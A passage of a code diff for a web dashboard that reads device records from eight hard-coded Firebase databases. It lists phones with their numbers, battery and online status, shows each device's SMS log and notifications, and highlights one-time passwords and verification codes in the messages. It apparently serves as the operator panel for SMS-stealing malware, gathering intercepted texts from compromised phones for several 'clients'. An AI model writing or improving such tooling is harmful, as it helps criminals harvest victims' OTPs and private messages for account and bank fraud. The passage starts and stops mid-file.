-                    const num = parseInt(val, 10);
-                    if (!isNaN(num)) return num;
-                }
-                if (typeof val === 'number') return val;
-            }
-            return null;
-        }
-
-        function getStatus(device) {
-            if (!device) return false;
-            // status can be boolean, or 'true'/'false' string
-            if (device.status === true || device.status === 'true') return true;
-            if (device.status === false || device.status === 'false') return false;
-            // Also check if there's a ping with wake
-            if (device.ping && device.ping.wake === true) return true;
-            return false;
-        }
-
-        function getLatestMessage(device) {
-            if (!device) return null;
-            // Check sms_logs
-            if (device.sms_logs) {
-                const keys = Object.keys(device.sms_logs);
-                if (keys.length > 0) {
-                    let latest = null;
-                    let latestTs = 0;
-                    for (const k of keys) {
-                        const item = device.sms_logs[k];
-                        const ts = item.timestamp || 0;
-                        if (ts > latestTs) {
-                            latestTs = ts;
-                            latest = item;
-                        }
-                    }
-                    return latest;
-                }
-            }
-            // Check for command/message fields
-            if (device.message) return { message: device.message, sender: 'command' };
-            if (device.sms) return { message: device.sms, sender: 'command' };
-            if (device.text) return { message: device.text, sender: 'command' };
-            return null;
-        }
-
-        function getAllMessages(device) {
-            const msgs = [];
-            if (!device) return msgs;
-            if (device.sms_logs) {
-                for (const key in device.sms_logs) {
-                    const item = device.sms_logs[key];
-                    msgs.push({
-                        id: key,
-                        sender: item.sender || 'Unknown',
-                        message: item.message || '',
-                        timestamp: item.timestamp || Date.now()
-                    });
-                }
-            }
-            // Also add command messages if present
-            if (device.message) {
-                msgs.push({ id: 'cmd1', sender: 'command', message: device.message, timestamp: Date.now() });
-            }
-            if (device.sms) {
-                msgs.push({ id: 'cmd2', sender: 'command', message: device.sms, timestamp: Date.now() });
-            }
-            if (device.text) {
-                msgs.push({ id: 'cmd3', sender: 'command', message: device.text, timestamp: Date.now() });
-            }
-            // Sort by timestamp descending
-            msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-            return msgs;
-        }
-
-        function getSourceName(sourceId) {
-            const found = SOURCES.find(s => s.id === sourceId);
-            return found ? found.id : sourceId;
-        }
-
-        function getSourceDisplay(sourceId) {
-            const map = {
-                'sssssmmmmsw': 'prime',
-                'neha': 'neha',
-                'rajkumar': 'raj',
-                'romini': 'rom',
-                'strboii': 'str',
-                'kalui': 'kalu',
-                'babayou': 'baba',
-                'annu': 'annu'
-            };
-            return map[sourceId] || sourceId.substring(0, 4);
-        }
-
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 4. FIREBASE HELPERS
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        function initFirebaseApp(source) {
-            if (apps[source.id]) return apps[source.id];
-            try {
-                const app = firebase.initializeApp({
-                    databaseURL: source.url
-                }, source.id);
-                apps[source.id] = app;
-                return app;
-            } catch (e) {
-                console.warn('Failed to init app for', source.id, e);
-                return null;
-            }
-        }
-
-        function fetchSourceData(source) {
-            return new Promise((resolve) => {
-                const app = initFirebaseApp(source);
-                if (!app) return resolve({ source, data: null, error: 'init failed' });
-
-                const db = firebase.database(app);
-                // For primary source, data is under /users, for others under /clients
-                const path = source.id === 'sssssmmmmsw' ? 'users' : 'clients';
-                const ref = db.ref(path);
-
-                ref.once('value', (snapshot) => {
-                    const val = snapshot.val();
-                    resolve({ source, data: val, error: null });
-                }, (err) => {
-                    console.error('Error fetching', source.id, err);
-                    resolve({ source, data: null, error: err.message });
-                });
-            });
-        }
-
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 5. LOAD ALL SOURCES
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        async function loadAllSources() {
-            const grid = document.getElementById('deviceGrid');
-            grid.innerHTML = `
-                <div class="loading-placeholder">
-                    <div class="spinner"></div>
-                    <span>Loading ${SOURCES.length} databases…</span>
+    <!-- Main Layout -->
+    <div class="main-layout">
+        <!-- Left: Devices -->
+        <div class="devices-panel">
+            <div class="panel-header">
+                <h2>📱 All Devices</h2>
+                <span class="badge" id="deviceCount">0 devices</span>
+            </div>
+            <div class="search-box">
+                <input type="text" id="searchInput" placeholder="Search by ID or phone..." oninput="filterDevices()">
+                <div class="toggle-group">
+                    <button class="active" id="allToggle" onclick="setFilter('all')">All</button>
+                    <button id="onlineToggle" onclick="setFilter('online')">Online</button>
                 </div>
-            `;
+            </div>
+            <div class="devices-grid" id="devicesGrid">
+                <div class="loading">Loading devices...</div>
+            </div>
+        </div>
 
-            const promises = SOURCES.map(s => fetchSourceData(s));
-            const results = await Promise.all(promises);
+        <!-- Right: SMS Inbox -->
+        <div class="inbox-panel">
+            <div class="panel-header">
+                <div>
+                    <h2>📨 SMS Inbox <span class="notification-dot" id="newMsgDot"></span></h2>
+                    <div class="device-info" id="selectedDeviceInfo">Select a device to view messages</div>
+                </div>
+                <div class="device-info" id="smsTotalCount" style="font-size:10px;color:#556;"></div>
+            </div>
+            <div class="inbox-messages" id="inboxMessages">
+                <div class="inbox-placeholder">👈 Select a device from the left</div>
+            </div>
+        </div>
+    </div>
+</div>
 
-            // Build device list
-            const newDevices = {};
-            const newList = [];
+<!-- Toast -->
+<div class="toast" id="toast"></div>
 
-            for (const result of results) {
-                if (!result.data) continue;
-                const sourceId = result.source.id;
-                const data = result.data;
+<script>
+    // ===== FIREBASE CONFIG =====
+    // All database sources
+    const SOURCES = [
+        { id: 'primary', url: 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app', path: 'users' },
+        { id: 'neha', url: 'https://neha-2e45d-default-rtdb.firebaseio.com/', path: 'clients' },
+        { id: 'rajkumar', url: 'https://rajkumar-a67fb-default-rtdb.firebaseio.com/', path: 'clients' },
+        { id: 'romini', url: 'https://romini-57831-default-rtdb.firebaseio.com/', path: 'clients' },
+        { id: 'strboii', url: 'https://strboii-default-rtdb.firebaseio.com/', path: 'clients' },
+        { id: 'kalui', url: 'https://kalui-a8e2b-default-rtdb.firebaseio.com/', path: 'clients' },
+        { id: 'babayou', url: 'https://babayou-ca160-default-rtdb.firebaseio.com/', path: 'clients' },
+        { id: 'annu', url: 'https://annu-f0207-default-rtdb.firebaseio.com/', path: 'clients' }
+    ];
 
-                for (const deviceId in data) {
-                    const deviceData = data[deviceId];
-                    const compositeId = getCompositeId(sourceId, deviceId);
-                    const enriched = {
-                        ...deviceData,
-                        _source: sourceId,
-                        _deviceId: deviceId,
-                        _compositeId: compositeId,
-                    };
-                    newDevices[compositeId] = enriched;
-                    newList.push({
-                        id: compositeId,
-                        source: sourceId,
-                        data: enriched,
-                    });
-                }
-            }
+    // Firebase app instances cache
+    const apps = {};
 
-            allDevices = newDevices;
-            deviceList = newList;
+    // ===== STATE =====
+    let allUsers = {};
+    let selectedDeviceId = null;
+    let currentFilter = 'all';
+    let searchQuery = '';
+    let isInitialLoad = true;
 
-            // Populate source selector
-            renderSourceSelector();
-            // Render devices
-            applyFiltersAndRender();
-            // Update stats
-            updateStats();
-        }
+    // ===== TOAST =====
+    function showToast(msg) {
+        const toast = document.getElementById('toast');
+        toast.textContent = msg;
+        toast.classList.add('show');
+        clearTimeout(toast._timeout);
+        toast._timeout = setTimeout(() => toast.classList.remove('show'), 2000);
+    }
 
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 6. RENDER SOURCE SELECTOR
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        function renderSourceSelector() {
-            const container = document.getElementById('sourceSelector');
-            const sources = SOURCES;
-            // Count devices per source
-            const counts = {};
-            for (const item of deviceList) {
-                counts[item.source] = (counts[item.source] || 0) + 1;
-            }
-
-            let html = `<button class="source-btn active" data-source="all">📡 all (${deviceList.length})</button>`;
-            for (const s of sources) {
-                const count = counts[s.id] || 0;
-                const display = getSourceDisplay(s.id);
-                html += `<button class="source-btn" data-source="${s.id}">${display} (${count})</button>`;
-            }
-            container.innerHTML = html;
-
-            // Attach click events
-            container.querySelectorAll('.source-btn').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    container.querySelectorAll('.source-btn').forEach(b => b.classList.remove('active'));
-                    btn.classList.add('active');
-                    selectedSource = btn.dataset.source;
-                    applyFiltersAndRender();
-                });
-            });
-        }
-
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 7. FILTER & RENDER
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        function applyFiltersAndRender() {
-            let filtered = [...deviceList];
-
-            // Source filter
-            if (selectedSource !== 'all') {
-                filtered = filtered.filter(item => item.source === selectedSource);
-            }
-
-            // Online filter
-            if (filterMode === 'online') {
-                filtered = filtered.filter(item => getStatus(item.data) === true);
-            }
-
-            // Search
-            if (searchQuery.trim()) {
-                const q = searchQuery.trim().toLowerCase();
-                filtered = filtered.filter(item => {
-                    const phone = getPhoneNumber(item.data) || '';
-                    const id = item.id.toLowerCase();
-                    return id.includes(q) || phone.toLowerCase().includes(q);
-                });
-            }
-
-            renderDevices(filtered);
-            updateStats();
-        }
-
-        function renderDevices(list) {
-            const grid = document.getElementById('deviceGrid');
-
-            if (list.length === 0) {
-                grid.innerHTML = `<div class="no-results">No devices found</div>`;
-                return;
-            }
-
-            let html = '';
-            for (const item of list) {
-                const data = item.data;
-                const phone = getPhoneNumber(data) || '—';
-                const battery = getBattery(data);
-                const status = getStatus(data);
-                const latest = getLatestMessage(data);
-                const sourceDisplay = getSourceDisplay(item.source);
-
-                let batteryHtml = '';
-                if (battery !== null && battery !== undefined) {
-                    let cls = 'good';
-                    if (battery < 30) cls = 'low';
-                    else if (battery < 55) cls = 'mid';
-                    batteryHtml = `
-                        <span class="badge-battery">
-                            🔋 ${battery}%
-                            <span class="level"><span class="fill ${cls}" style="width:${Math.min(battery,100)}%;"></span></span>
-                        </span>
-                    `;
-                } else {
-                    batteryHtml = `<span class="badge-battery">🔋 —</span>`;
-                }
-
-                const statusHtml = `
-                    <span class="badge-status ${status ? 'online' : 'offline'}">
-                        <span class="dot"></span> ${status ? 'online' : 'offline'}
-                    </span>
-                `;
-
-                let previewHtml = '';
-                if (latest && latest.message) {
-                    const sender = latest.sender || 'Unknown';
-                    const msg = latest.message.length > 60 ? latest.message.substring(0, 60) + '…' : latest.message;
-                    previewHtml = `
-                        <div class="sms-preview">
-                            <span class="sender">${escapeHtml(sender)}</span>: ${escapeHtml(msg)}
-                        </div>
-                    `;
-                }
-
-                const phoneDisplay = phone && phone !== '—' ? phone : 'no number';
-
-                html += `
-                    <div class="device-card" data-composite="${item.id}" onclick="openInbox('${item.id}')">
-                        <div class="row">
-                            <div>
-                                <div class="id">${escapeHtml(item.id.substring(0, 18))}…</div>
-                                <div class="phone">
-                                    ${escapeHtml(phoneDisplay)}
-                                    ${phone && phone !== '—' ? `<button class="copy-btn" onclick="event.stopPropagation(); copyPhone('${escapeHtml(phone)}')">📋</button>` : ''}
-                                </div>
-                            </div>
-                            <div class="badges">
-                                ${statusHtml}
-                                ${batteryHtml}
-                                <span class="source-tag">${sourceDisplay}</span>
-                            </div>
-                        </div>
-                        ${previewHtml}
-                    </div>
-                `;
-            }
-
-            grid.innerHTML = html;
-        }
-
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 8. INBOX PANEL — FIXED to open correctly
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        function openInbox(compositeId) {
-            // Prevent opening if no device is selected or if the id is invalid
-            if (!compositeId || !allDevices[compositeId]) {
-                showToast('Device not found');
-                return;
-            }
-
-            selectedDeviceId = compositeId;
-            const device = allDevices[compositeId];
-
-            const panel = document.getElementById('inboxPanel');
-            const container = document.getElementById('inboxMessagesContainer');
-            const info = document.getElementById('inboxDeviceInfo');
-            const phoneEl = document.getElementById('inboxPhone');
-            const batteryEl = document.getElementById('inboxBattery');
-
-            const phone = getPhoneNumber(device) || '—';
-            const battery = getBattery(device);
-            phoneEl.textContent = phone;
-            batteryEl.textContent = battery !== null && battery !== undefined ? `${battery}%` : '—';
-
-            const sourceName = getSourceName(device._source);
-            info.innerHTML = `<strong>${escapeHtml(device._deviceId?.substring(0, 12) || '')}…</strong> · ${sourceName}`;
-
-            const messages = getAllMessages(device);
-            if (messages.length === 0) {
-                container.innerHTML = `<div class="inbox-empty">📭 No messages for this device</div>`;
-            } else {
-                let html = '';
-                for (const msg of messages) {
-                    const isOTP = /otp|code|verification|password/i.test(msg.message || '');
-                    let body = escapeHtml(msg.message || '');
-                    if (isOTP) {
-                        const match = (msg.message || '').match(/\b\d{4,6}\b/);
-                        if (match) {
-                            body = body.replace(match[0], `<span class="otp">${match[0]}</span>`);
-                        }
-                    }
-                    html += `
-                        <div class="inbox-message">
-                            <div>
-                                <span class="msg-sender">${escapeHtml(msg.sender || 'Unknown')}</span>
-                                <span class="msg-time">${formatTime(msg.timestamp)}</span>
-                            </div>
-                            <div class="msg-body">${body}</div>
-                        </div>
-                    `;
-                }
-                container.innerHTML = html;
-            }
-
-            // Open panel
-            panel.classList.add('open');
-            document.getElementById('fabBadge').style.display = 'none';
-        }
-
-        function closeInbox() {
-            document.getElementById('inboxPanel').classList.remove('open');
-        }
-
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 9. UTILITIES
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        function escapeHtml(text) {
-            if (!text) return '';
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-
-        function formatTime(ts) {
-            if (!ts) return 'N/A';
-            const d = new Date(ts);
-            if (isNaN(d.getTime())) return 'N/A';
-            return d.toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit' });
-        }
-
-        function copyPhone(phone) {
-            if (navigator.clipboard && navigator.clipboard.writeText) {
-                navigator.clipboard.writeText(phone).then(() => {
-                    showToast('📋 Copied: ' + phone);
-                }).catch(() => {
-                    fallbackCopy(phone);
-                });
-            } else {
-                fallbackCopy(phone);
-            }
-        }
-
-        function fallbackCopy(text) {
+    // ===== COPY =====
+    function copyToClipboard(text) {
+        navigator.clipboard?.writeText(text).then(() => {
+            showToast(`📋 Copied: ${text}`);
+        }).catch(() => {
             const input = document.createElement('input');
             input.value = text;
             document.body.appendChild(input);
             input.select();
             document.execCommand('copy');
             document.body.removeChild(input);
-            showToast('📋 Copied: ' + text);
+            showToast(`📋 Copied: ${text}`);
+        });
+    }
+
+    // ===== HELPERS =====
+    function parseTimestamp(ts) {
+        if (!ts) return 'N/A';
+        if (typeof ts === 'number') return new Date(ts).toLocaleString();
+        if (typeof ts === 'string') {
+            const d = new Date(ts);
+            if (!isNaN(d.getTime())) return d.toLocaleString();
+            return ts;
         }
+        return String(ts);
+    }
 
-        let toastTimer = null;
+    function isOnline(userData) {
+        if (!userData) return false;
+        // Check status field
+        if (userData.status === true || userData.status === 'true') return true;
+        if (userData.status === false || userData.status === 'false') return false;
+        // Check ping.wake
+        if (userData.ping && userData.ping.wake === true) return true;
+        // Check isOnline (from primary source)
+        if (userData.isOnline === true) return true;
+        return false;
+    }
 
-        function showToast(msg) {
-            let toast = document.getElementById('toast');
-            if (!toast) {
-                toast = document.createElement('div');
-                toast.id = 'toast';
-                toast.style.cssText = `
-                        position: fixed; bottom: 90px; left: 50%; transform: translateX(-50%);
-                        background: var(--bg-card); color: var(--text-primary);
-                        padding: 10px 20px; border-radius: var(--radius-sm);
-                        border: 1px solid var(--border-subtle);
-                        font-size: 0.75rem; z-index: 200;
-                        box-shadow: var(--shadow);
-                        transition: opacity 0.3s;
-                        opacity: 0;
-                        pointer-events: none;
-                        max-width: 90%;
-                        text-align: center;
-                    `;
-                document.body.appendChild(toast);
-            }
-            toast.textContent = msg;
-            toast.style.opacity = '1';
-            clearTimeout(toastTimer);
-            toastTimer = setTimeout(() => {
-                toast.style.opacity = '0';
-            }, 2200);
-        }
-
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 10. STATS
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        function updateStats() {
-            const total = deviceList.length;
-            let online = 0;
-            let totalSms = 0;
-
-            for (const item of deviceList) {
-                if (getStatus(item.data)) online++;
-                const msgs = getAllMessages(item.data);
-                totalSms += msgs.length;
-            }
-
-            document.getElementById('onlineCount').textContent = online;
-            document.getElementById('totalCount').textContent = total;
-            document.getElementById('smsCount').textContent = totalSms;
-
-            // Update FAB badge
-            const badge = document.getElementById('fabBadge');
-            if (totalSms > 0) {
-                badge.textContent = totalSms > 99 ? '99+' : totalSms;
-                badge.style.display = 'flex';
-            } else {
-                badge.style.display = 'none';
+    function getPhoneNumber(userData) {
+        if (!userData) return null;
+        // Primary source: simInfo
+        if (userData.simInfo) {
+            for (const key in userData.simInfo) {
+                const sim = userData.simInfo[key];
+                if (sim.number) return sim.number;
+                if (sim.phoneNumber) return sim.phoneNumber;
             }
         }
+        // Other sources
+        if (userData.mobNo) return userData.mobNo;
+        if (userData.mobile) return userData.mobile;
+        if (userData.phone) return userData.phone;
+        if (userData.phoneNumber) return userData.phoneNumber;
+        // sims array
+        if (userData.sims && Array.isArray(userData.sims)) {
+            for (const sim of userData.sims) {
+                if (sim.phoneNumber) return sim.phoneNumber;
+                if (sim.number) return sim.number;
+            }
+        }
+        return null;
+    }
 
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        // 11. EVENT BINDINGS
-        // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-        document.addEventListener('DOMContentLoaded', () => {
-            // Load data
-            loadAllSources();
+    function getBattery(userData) {
+        if (!userData) return 'N/A';
+        let val = userData.battery;
+        if (val !== undefined && val !== null) {
+            if (typeof val === 'string') {
+                const num = parseInt(val, 10);
+                if (!isNaN(num)) return num;
+            }
+            if (typeof val === 'number') return val;
+        }
+        return 'N/A';
+    }
 
-            // Search
-            document.getElementById('searchInput').addEventListener('input', (e) => {
-                searchQuery = e.target.value;
-                applyFiltersAndRender();
-            });
+    function getSmsCount(userData) {
+        if (!userData) return 0;
+        // Primary source: sms_logs
+        if (userData.sms_logs) {
+            return Object.keys(userData.sms_logs).length;
+        }
+        // Other sources might have messages in different places
+        let count = 0;
+        if (userData.message) count++;
+        if (userData.sms) count++;
+        if (userData.text) count++;
+        return count;
+    }
 
-            // Filter buttons
-            document.querySelectorAll('.filter-group button').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    document.querySelectorAll('.filter-group button').forEach(b => b.classList.remove(
-                    'active'));
-                    btn.classList.add('active');
-                    filterMode = btn.dataset.filter;
-                    applyFiltersAndRender();
-                });
-            });
+    function getLatestSms(userData) {
+        if (!userData) return null;
+        // Primary source: sms_logs
+        if (userData.sms_logs) {
+            const entries = Object.entries(userData.sms_logs);
+            if (entries.length === 0) return null;
+            entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+            return entries[0][1];
+        }
+        // Other sources: check for message fields
+        if (userData.message) return { message: userData.message, sender: 'command' };
+        if (userData.sms) return { message: userData.sms, sender: 'command' };
+        if (userData.text) return { message: userData.text, sender: 'command' };
+        return null;
+    }
 
-            // Close inbox
-            document.getElementById('closeInboxBtn').addEventListener('click', closeInbox);
+    function getAllSms(userData) {
+        if (!userData) return [];
+        let messages = [];
+        // Primary source: sms_logs
+        if (userData.sms_logs) {
+            const entries = Object.entries(userData.sms_logs);
+            entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+            messages = entries.map(e => ({ id: e[0], ...e[1] }));
+        }
+        // Other sources: add command messages
+        if (userData.message) {
+            messages.push({ id: 'cmd1', sender: 'command', message: userData.message, timestamp: Date.now() });
+        }
+        if (userData.sms) {
+            messages.push({ id: 'cmd2', sender: 'command', message: userData.sms, timestamp: Date.now() });
+        }
+        if (userData.text) {
+            messages.push({ id: 'cmd3', sender: 'command', message: userData.text, timestamp: Date.now() });
+        }
+        // Sort by timestamp descending
+        messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+        return messages;
+    }
 
-            // FAB: open/close inbox
-            document.getElementById('fabBtn').addEventListener('click', () => {
-                const panel = document.getElementById('inboxPanel');
-                if (panel.classList.contains('open')) {
-                    closeInbox();
-                } else {
-                    // If no device selected, pick the first one
-                    if (!selectedDeviceId && deviceList.length > 0) {
-                        openInbox(deviceList[0].id);
-                    } else if (selectedDeviceId) {
-                        openInbox(selectedDeviceId);
-                    } else {
-                        showToast('No devices loaded');
-                    }
-                }
-            });
+    function getAllNotifications(userData) {
+        if (!userData?.notifications) return [];
+        const entries = Object.entries(userData.notifications);
+        entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
+        return entries.map(e => ({ id: e[0], ...e[1] }));
+    }
 
-            // Click outside to close inbox (on backdrop)
-            document.addEventListener('click', (e) => {
-                const panel = document.getElementById('inboxPanel');
-                const fab = document.getElementById('fabBtn');
-                if (panel.classList.contains('open')) {
-                    const isPanel = panel.contains(e.target);
-                    const isFab = fab.contains(e.target);
-                    if (!isPanel && !isFab) {
-                        closeInbox();
-                    }
-                }
+    function escapeHtml(text) {
+        if (!text) return '';
+        const div = document.createElement('div');
+        div.textContent = text;
+        return div.innerHTML;
+    }
+
+    // ===== FIREBASE HELPERS =====
+    function initFirebaseApp(source) {
+        if (apps[source.id]) return apps[source.id];
+        try {
+            const app = firebase.initializeApp({
+                databaseURL: source.url
+            }, source.id);
+            apps[source.id] = app;
+            return app;
+        } catch (e) {
+            console.warn('Failed to init app for', source.id, e);
+            return null;
+        }
+    }
+
+    function fetchSourceData(source) {
+        return new Promise((resolve) => {
+            const app = initFirebaseApp(source);
+            if (!app) return resolve({ source, data: null });
+
+            const db = firebase.database(app);
+            const ref = db.ref(source.path);
+
+            ref.once('value', (snapshot) => {
+                resolve({ source, data: snapshot.val() });
+            }, (err) => {
+                console.error('Error fetching', source.id, err);
+                resolve({ source, data: null });
             });
         });
+    }
 
-        // Make functions globally accessible for inline onclick
-        window.openInbox = openInbox;
-        window.closeInbox = closeInbox;
-        window.copyPhone = copyPhone;
-        window.showToast = showToast;
-    </script>
+    // ===== MAIN FETCH =====
+    async function fetchAllData() {
+        const btn = document.getElementById('refreshBtn');
+        const loading = document.getElementById('devicesGrid');
+        btn.disabled = true;
+        loading.innerHTML = '<div class="loading"><div class="spinner"></div>Loading devices...</div>';
 
+        try {
+            // Fetch from all sources
+            const promises = SOURCES.map(s => fetchSourceData(s));
+            const results = await Promise.all(promises);
+
+            // Merge all data
+            const mergedData = {};
+            for (const result of results) {
+                if (!result.data) continue;
+                const sourceId = result.source.id;
+                const data = result.data;
+                
+                // Add source prefix to device IDs to avoid conflicts
+                for (const deviceId in data) {
+                    const compositeId = `${sourceId}::${deviceId}`;
+                    mergedData[compositeId] = {
+                        ...data[deviceId],
+                        _source: sourceId,
+                        _deviceId: deviceId
+                    };
+                }
+            }
+
+            allUsers = mergedData;
+            renderDevices();
+            if (selectedDeviceId && allUsers[selectedDeviceId]) {
+                renderInbox();
+            }
+            updateStats();
+
+            if (isInitialLoad) {
+                isInitialLoad = false;
+                const ids = Object.keys(allUsers);
+                if (ids.length > 0) {
+                    selectDevice(ids[0]);
+                }
+            }
+
+        } catch (error) {
+            console.error('Fetch error:', error);
+            loading.innerHTML = `
+                <div class="loading">❌ Error: ${escapeHtml(error.message)}<br>
+                <button onclick="fetchAllData()" style="margin-top:8px;background:rgba(79,195,247,0.15);color:#4fc3f7;border:1px solid rgba(79,195,247,0.3);padding:6px 16px;border-radius:6px;cursor:pointer;">Retry</button></div>
+            `;
+        } finally {
+            btn.disabled = false;
+        }
+    }
+
+    // ===== RENDER FUNCTIONS =====
+    function renderDevices() {
+        const grid = document.getElementById('devicesGrid');
+        grid.innerHTML = '';
+
+        let userIds = Object.keys(allUsers);
+
+        if (currentFilter === 'online') {
+            userIds = userIds.filter(id => isOnline(allUsers[id]));
+        }
+
+        if (searchQuery.trim()) {
+            const query = searchQuery.trim().toLowerCase();
+            userIds = userIds.filter(id => {
+                const user = allUsers[id];
+                const phone = getPhoneNumber(user) || '';
+                return id.toLowerCase().includes(query) || phone.includes(query);
+            });
+        }
+
+        if (userIds.length === 0) {
+            grid.innerHTML = `<div class="loading">${currentFilter === 'online' ? 'No online devices' : 'No devices found'}</div>`;
+            document.getElementById('deviceCount').textContent = '0 devices';
+            return;
+        }
+
+        document.getElementById('deviceCount').textContent = `${userIds.length} devices`;
+
+        userIds.forEach(id => {
+            const user = allUsers[id];
+            const online = isOnline(user);
+            const phone = getPhoneNumber(user);
+            const battery = getBattery(user);
+            const smsCount = getSmsCount(user);
+            const latest = getLatestSms(user);
+            const isSelected = id === selectedDeviceId;
+
+            const card = document.createElement('div');
+            card.className = `device-card ${!online ? 'offline' : ''} ${isSelected ? 'selected' : ''}`;
+            card.dataset.deviceId = id;
+            card.onclick = () => selectDevice(id);
+
+            const displayPhone = phone || 'No number';
+            const isCopyable = phone && phone.length > 0;
+
+            let previewHtml = '';
+            if (latest && latest.message) {
+                const sender = latest.sender || 'Unknown';
+                const msg = latest.message.length > 50 ? latest.message.substring(0, 50) + '...' : latest.message;
+                previewHtml = `
+                    <div class="device-sms-preview">
+                        <span class="sender">${escapeHtml(sender)}</span>: ${escapeHtml(msg)}
+                    </div>
+                `;
+            }
+
+            // Show source tag
+            const sourceTag = user._source || 'unknown';
+            const sourceDisplay = sourceTag.substring(0, 4);
+
+            card.innerHTML = `
+                <div class="device-row">
+                    <div>
+                        <div class="device-id">${escapeHtml(id.substring(0, 14))}...</div>
+                        <div class="device-phone ${isCopyable ? 'copyable' : ''}" 
+                             onclick="${isCopyable ? `event.stopPropagation(); copyToClipboard('${phone}')` : ''}">
+                            ${isCopyable ? '📞 ' : ''}${escapeHtml(displayPhone)}
+                            <span style="font-size:8px;color:#556;margin-left:6px;">${sourceDisplay}</span>
+                        </div>
+                    </div>
+                    <div class="device-status">
+                        <span class="status-dot ${online ? 'online' : 'offline'}"></span>
+                        <span class="battery">🔋 ${battery}%</span>
+                        <span class="sms-count">${smsCount}</span>
+                    </div>
+                </div>
+                ${previewHtml}
+            `;
+
+            grid.appendChild(card);
+        });
+
+        if (!selectedDeviceId && userIds.length > 0) {
+            selectDevice(userIds[0]);
+        }
+    }
+
+    function selectDevice(deviceId) {
+        if (selectedDeviceId === deviceId) return;
+        selectedDeviceId = deviceId;
+        renderDevices();
+        renderInbox();
+        document.getElementById('newMsgDot').classList.remove('show');
+    }
+
+    function renderInbox(newMessageId = null) {
+        const container = document.getElementById('inboxMessages');
+        const info = document.getElementById('selectedDeviceInfo');
+        const totalCount = document.getElementById('smsTotalCount');
+
+        if (!selectedDeviceId || !allUsers[selectedDeviceId]) {
+            container.innerHTML = '<div class="inbox-placeholder">👈 Select a device from the left</div>';
+            info.textContent = 'Select a device to view messages';
+            totalCount.textContent = '';
+            return;
+        }
+
+        const user = allUsers[selectedDeviceId];
+        const phone = getPhoneNumber(user) || 'No number';
+        const battery = getBattery(user);
+        const smsList = getAllSms(user);
+        const notifList = getAllNotifications(user);
+
+        info.innerHTML = `<strong>${escapeHtml(selectedDeviceId.substring(0, 12))}...</strong> · 📞 ${escapeHtml(phone)} · 🔋 ${battery}%`;
+        totalCount.textContent = `${smsList.length + notifList.length} messages`;
+
+        if (smsList.length === 0 && notifList.length === 0) {
+            container.innerHTML = '<div class="inbox-placeholder">📭 No messages for this device</div>';
+            return;
+        }
+
+        if (newMessageId) {
+            const newSms = smsList.find(s => s.id === newMessageId);
+            if (newSms) {
+                const div = document.createElement('div');
+                div.className = 'inbox-message new-message';
+                const sender = newSms.sender || 'Unknown';
+                const isOTP = /otp|code|verification/i.test(newSms.message);
+                let bodyHtml = escapeHtml(newSms.message || '');
+                
+                if (isOTP) {
+                    const otpMatch = newSms.message.match(/\b\d{4,6}\b/);
+                    if (otpMatch) {
+                        bodyHtml = bodyHtml.replace(otpMatch[0], `<span class="otp-code">${otpMatch[0]}</span>`);
+                    }
+                }
+
+                div.innerHTML = `
+                    <div class="msg-header">
+                        <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
+                        <span class="msg-time">${parseTimestamp(newSms.timestamp)}</span>
+                    </div>
+                    <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
+                `;
+                
+                container.prepend(div);
+                container.scrollTop = 0;
+                document.getElementById('newMsgDot').classList.add('show');
+                updateDeviceCardSmsCount(selectedDeviceId);
+                updateStats();
+                return;
+            }
+        }
+
+        container.innerHTML = '';
+
+        notifList.forEach(notif => {
+            const div = document.createElement('div');
+            div.className = 'inbox-message';
+            div.innerHTML = `
+                <div class="msg-header">
+                    <span class="msg-sender">🔔 ${escapeHtml(notif.app || 'Notification')}</span>
+                    <span class="msg-time">${parseTimestamp(notif.timestamp)}</span>
+                </div>
+                <div class="msg-body"><strong>${escapeHtml(notif.title || '')}</strong><br>${escapeHtml(notif.message || '')}</div>
+            `;
+            container.appendChild(div);
+        });
+
+        smsList.forEach(sms => {
+            const div = document.createElement('div');
+            div.className = 'inbox-message';
+            const sender = sms.sender || 'Unknown';
+            const isOTP = /otp|code|verification/i.test(sms.message);
+            let bodyHtml = escapeHtml(sms.message || '');
+            
+            if (isOTP) {
+                const otpMatch = sms.message.match(/\b\d{4,6}\b/);
+                if (otpMatch) {
+                    bodyHtml = bodyHtml.replace(otpMatch[0], `<span class="otp-code">${otpMatch[0]}</span>`);
+                }
+            }
+
+            div.innerHTML = `
+                <div class="msg-header">
+                    <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
+                    <span class="msg-time">${parseTimestamp(sms.timestamp)}</span>
+                </div>
+                <div class="msg-body ${isOTP ? 'highlight' : ''}">${bodyHtml}</div>
+            `;
+            container.appendChild(div);
+        });
+
